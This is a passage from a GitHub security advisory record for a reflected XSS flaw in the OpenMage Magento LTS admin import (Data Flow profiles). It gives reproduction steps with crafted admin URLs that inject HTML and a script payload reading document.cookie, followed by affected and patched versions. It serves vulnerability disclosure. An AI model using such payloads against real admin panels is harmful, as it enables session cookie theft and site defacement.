File Link: [customer_20260212_204335.csv](https://github.com/user-attachments/files/25629638/customer_20260212_204335.csv) + Go back to `Run profile`. + Select the uploaded file and Click on `Run in Popup`. + One can see a URL like this ``` https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/import-20260215151125-1_customer_20260212_204335.csv/ ``` + One can see the filename getting reflection in HTML tags. + Inject an HTML tag and observe. ``` https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/">

hacked

/ ``` + One can see the tag is getting executed. + Proceed for XSS. ``` https://demo-admin.openmage.org/index.php/admin/system_convert_gui/run/id/6/key/40dbbb2e93f45f0463c57ff733352f4f/files/%3CScRiPt%20%3Eprompt(document.cookie)%3C%2FScRiPt%3E ``` + There is an XSS popup. ## Impact Cookie stealing, JS deface, many more", "epss": {"percentage": 0.00258, "percentile": 0.16893}, "ghsa_id": "GHSA-x8jv-q8j2-487c", "github_reviewed_at": "2026-05-06T20:57:37Z", "html_url": "https://github.com/advisories/GHSA-x8jv-q8j2-487c", "identifiers": [{"type": "GHSA", "value": "GHSA-x8jv-q8j2-487c"}, {"type": "CVE", "value": "CVE-2026-42458"}], "nvd_published_at": "2026-05-15T17:16:46Z", "published_at": "2026-05-06T20:57:37Z", "references": ["https://github.com/OpenMage/magento-lts/security/advisories/GHSA-x8jv-q8j2-487c", "https://nvd.nist.gov/vuln/detail/CVE-2026-42458", "https://github.com/advisories/GHSA-x8jv-q8j2-487c"], "repository_advisory_url": "https://api.github.com/repos/OpenMage/magento-lts/security-advisories/GHSA-x8jv-q8j2-487c", "severity": "medium", "source_code_location": "https://github.com/OpenMage/magento-lts", "summary": "Magento LTS: Reflected XSS - Import -> Data Flow (profiles) ", "type": "reviewed", "updated_at": "2026-05-15T23:49:09Z", "url": "https://api.github.com/advisories/GHSA-x8jv-q8j2-487c", "vulnerabilities": [{"first_patched_version": "20.18.0", "package": {"ecosystem": "composer", "name": "openmage/magento-lts"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 20.17.0"}], "withdrawn_at": null}

title: Magento LTS: Reflected XSS - Import -> Data Flow (profiles)
